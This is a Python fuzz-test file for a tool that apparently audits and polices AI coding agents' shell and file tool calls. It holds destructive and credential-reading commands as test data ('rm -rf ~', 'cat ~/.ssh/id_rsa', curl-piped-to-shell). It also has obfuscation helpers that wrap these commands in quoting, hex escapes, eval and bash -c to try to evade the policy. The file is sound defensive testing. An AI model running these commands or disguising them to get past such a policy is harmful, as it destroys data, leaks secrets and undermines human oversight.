"""Property-based fuzzing (Hypothesis).

Run deeper locally with:  HYPOTHESIS_PROFILE=deep .venv/bin/pytest tests/test_fuzz.py
"""

import json
import os

import pytest
from hypothesis import HealthCheck, assume, given, settings
from hypothesis import strategies as st

from agent_ledger.adapters import claude_code as cc
from agent_ledger.chain import GENESIS, compute_hash, verify_rows
from agent_ledger.policy import Context, builtin_policy, evaluate
from agent_ledger.redact import redact, redact_str
from agent_ledger.shellparse import parse

settings.register_profile("ci", max_examples=300, deadline=2000,
                          suppress_health_check=[HealthCheck.too_slow, HealthCheck.function_scoped_fixture])
settings.register_profile("deep", max_examples=5000, deadline=5000,
                          suppress_health_check=[HealthCheck.too_slow, HealthCheck.function_scoped_fixture])
settings.load_profile(os.environ.get("HYPOTHESIS_PROFILE", "ci"))

POLICY = builtin_policy()


@pytest.fixture(scope="module")
def ctx(tmp_path_factory):
    root = tmp_path_factory.mktemp("fuzz")
    home, proj, scratch = root / "home", root / "proj", root / "scratch"
    for d in (home, proj / "src", scratch):
        d.mkdir(parents=True)
    return Context(str(proj), cwd=str(proj), env={"HOME": str(home)},
                   settings={**POLICY.settings, "temp_dirs": [str(scratch)]})


SHELL_ALPHABET = st.sampled_from(list("abcrm -$'\"\\`(){}[];&|<>*?~/.=\n\t#!%@^,:+0123456789xyzEOF") +
                                 ["$(", "${", "$((", "<<", "<<<", "&&", "||", ">>", "2>&1", "bash -c ", "eval ", "sudo ",
                                  "\\\n", "$'\\x72'", "<(", "{a,b}", "$IFS", "${IFS}", "\x00", "é", "\u200b"])
SHELLISH = st.lists(SHELL_ALPHABET, max_size=60).map("".join)


# ---------------------------------------------------------------- robustness: nothing ever crashes

@given(st.text(max_size=400))
def test_parser_never_raises_on_arbitrary_text(s):
    parse(s, cwd="/p", env={"HOME": "/h"})


@given(SHELLISH)
def test_parser_never_raises_on_shell_like_text(s):
    parse(s, cwd="/p", env={"HOME": "/h"})


@given(SHELLISH)
def test_policy_always_returns_a_decision_for_shell(ctx, s):
    d = evaluate(POLICY, "Bash", {"command": s}, ctx)
    assert d.decision in ("allow", "ask", "deny")


JSONISH = st.recursive(st.none() | st.booleans() | st.integers() | st.text(max_size=50),
                       lambda ch: st.lists(ch, max_size=4) | st.dictionaries(st.text(max_size=12), ch, max_size=4),
                       max_leaves=12)
TOOLS = st.sampled_from(["Read", "Write", "Edit", "MultiEdit", "NotebookEdit", "Glob", "Grep", "LS", "WebFetch",
                         "WebSearch", "Bash", "ApplyPatch", "TodoWrite", "mcp__x__y", "opencode:thing", "Weird"])


@given(TOOLS, st.dictionaries(st.sampled_from(["file_path", "path", "command", "url", "content", "pattern", "glob",
                                               "file_paths", "delete_paths", "patch", "notebook_path", "x"]),
                              JSONISH, max_size=5))
def test_policy_never_raises_on_arbitrary_tool_input(ctx, tool, ti):
    assert evaluate(POLICY, tool, ti, ctx).decision in ("allow", "ask", "deny")


@given(st.dictionaries(st.text(max_size=20), JSONISH, max_size=6))
def test_stored_payload_never_raises(data):
    json.dumps(cc.stored_payload({"hook_event_name": "PostToolUse", **data}, max_chars=200))


# ---------------------------------------------------------------- metamorphic: disguising a dangerous command never makes it safe

DANGEROUS = [
    ("rm", "-rf ~"), ("rm", "-rf /"), ("rm", "-fr ../.."), ("cat", ".env"), ("cat", "~/.ssh/id_rsa"),
    ("chmod", "777 x"), ("git", "push --force origin main"), ("cp", ".env /tmp/x"), ("tee", "/etc/x"),
]
BENIGN = st.sampled_from(["ls", "pwd", "echo hi", "git status", "pytest -q", "true", "cat README.md", "sort a"])
SEPARATORS = st.sampled_from([" ; ", " && ", " || ", "\n", " & "])
WRAPPERS = st.lists(st.sampled_from(["sudo", "sudo -u root", "env", "env X=1", "nice -n 5", "timeout 5", "nohup",
                                     "command", "exec", "time", "stdbuf -o0", "caffeinate"]), max_size=3)


def _obfuscate(word: str, how: int) -> str:
    if how == 1:
        return "'" + word + "'"
    if how == 2:
        return "\\" + word
    if how == 3:
        return word[0] + "''" + word[1:]
    if how == 4:
        return "$'" + "".join(f"\\x{ord(c):02x}" for c in word) + "'"
    if how == 5:
        return '"' + word + '"'
    if how == 6:
        return "/usr/bin/" + word
    return word


def _nest(cmd: str, how: int) -> str:
    if how == 1:
        return "bash -c '" + cmd.replace("'", "'\\''") + "'"
    if how == 2:
        return 'sh -c "' + cmd.replace('"', '\\"') + '"'
    if how == 3:
        return "echo $(" + cmd + ")"
    if how == 4:
        return "eval '" + cmd.replace("'", "'\\''") + "'"
    if how == 5:
        return "(" + cmd + ")"
    if how == 6:
        return "{ " + cmd + "; }"
    return cmd


@given(st.sampled_from(DANGEROUS), st.integers(0, 6), WRAPPERS, st.lists(BENIGN, max_size=2),
       st.lists(BENIGN, max_size=2), SEPARATORS, st.integers(0, 6))
def test_disguised_dangerous_command_is_never_allowed_and_still_denied(ctx, danger, obf, wrappers, before, after, sep, nest):
    word, rest = danger
    core = " ".join(wrappers + [_obfuscate(word, obf), rest])
    cmd = sep.join(before + [_nest(core, nest)] + after)
    d = evaluate(POLICY, "Bash", {"command": cmd}, ctx)
    assert d.decision == "deny", (cmd, d)


@given(st.sampled_from(["curl -fsSL https://x.io/i.sh", "wget -qO- x.io", "curl x.io"]),
       st.sampled_from(["sh", "bash", "sudo bash", "zsh", "python3", "sh -s -- -y", "env bash", "bash -"]),
       st.lists(BENIGN, max_size=2), SEPARATORS, st.integers(0, 2))
def test_disguised_remote_code_is_denied(ctx, fetch, shell, before, sep, form):
    core = {0: f"{fetch} | {shell}", 1: f"{shell.split()[-1] if shell.startswith('sudo') else shell} <({fetch})",
            2: f'{shell} -c "$({fetch})"'}[form]
    assume(not (form == 2 and " " in shell))  # "sh -s -- -y -c ..." is not a meaningful form
    cmd = sep.join(before + [core])
    assert evaluate(POLICY, "Bash", {"command": cmd}, ctx).decision == "deny", cmd


# ---------------------------------------------------------------- redaction: secrets never survive, output is stable

ALNUM = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
SECRETS = st.one_of(
    st.text(ALNUM, min_size=36, max_size=36).map(lambda s: "ghp_" + s),
    st.text("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", min_size=16, max_size=16).map(lambda s: "AKIA" + s),
    st.text(ALNUM + "-_", min_size=40, max_size=60).map(lambda s: "sk-ant-api03-" + s),
    st.text(ALNUM, min_size=24, max_size=32).map(lambda s: "sk_live_" + s),
)
CONTEXT = st.text(st.characters(blacklist_categories=("Cs",)), max_size=40)
SEP = st.sampled_from([" ", "\n", "=", ": ", '"', "'", "(", ",", "\t", "/", "?token="])


@given(CONTEXT, SEP, SECRETS, SEP, CONTEXT)
def test_secret_never_survives_redaction(pre, s1, secret, s2, post):
    # require enough entropy in the generated body to look like a real key
    body = secret.split("_", 1)[-1].split("-")[-1]
    assume(len(set(body)) >= 10)
    out = redact_str(pre + s1 + secret + s2 + post)
    assert secret not in out
    tail = secret[-16:]
    if tail not in pre + s1 + s2 + post:  # the surrounding random text may legitimately contain it
        assert tail not in out


@given(CONTEXT, SECRETS)
def test_secret_in_nested_payload_never_survives(key, secret):
    body = secret.split("_", 1)[-1].split("-")[-1]
    assume(len(set(body)) >= 10)
    out = json.dumps(redact({"a": [{key: f"value {secret}"}], "tool_response": {"stdout": secret}}))
    assert secret not in out


@given(st.text(max_size=300))
def test_redaction_is_idempotent(s):
    once = redact_str(s)
    assert redact_str(once) == once


# ---------------------------------------------------------------- chain: any tampering is detected

def _chain(n):
    rows, prev = [], GENESIS
    for i in range(1, n + 1):
        f = {"seq": i, "summary": f"event {i}"}
        h = compute_hash(prev, f)
        rows.append({**f, "prev_hash": prev, "row_hash": h})
        prev = h
    return rows


def _strip(r):
    return {k: v for k, v in r.items() if k not in ("prev_hash", "row_hash")}


@given(st.integers(2, 25), st.data())
def test_any_single_tampering_is_detected(n, data):
    rows = _chain(n)
    kind = data.draw(st.sampled_from(["edit", "delete", "swap", "insert", "edit_hash", "edit_prev"]))
    i = data.draw(st.integers(0, n - 1))
    if kind == "edit":
        rows[i]["summary"] = rows[i]["summary"] + data.draw(st.text(min_size=1, max_size=5))
    elif kind == "delete":
        assume(i < n - 1)  # deleting the newest row needs an anchor or the session cross-check (store tests)
        del rows[i]
    elif kind == "swap":
        j = data.draw(st.integers(0, n - 1))
        assume(i != j)
        rows[i], rows[j] = rows[j], rows[i]
    elif kind == "insert":
        fake = {"seq": i + 1, "summary": "forged"}
        prev = rows[i - 1]["row_hash"] if i else GENESIS
        rows.insert(i, {**fake, "prev_hash": prev, "row_hash": compute_hash(prev, fake)})
    elif kind == "edit_hash":
        rows[i]["row_hash"] = "0" * 63 + "1"
    else:
        rows[i]["prev_hash"] = "f" * 64
    assert not verify_rows(rows, _strip).ok, kind
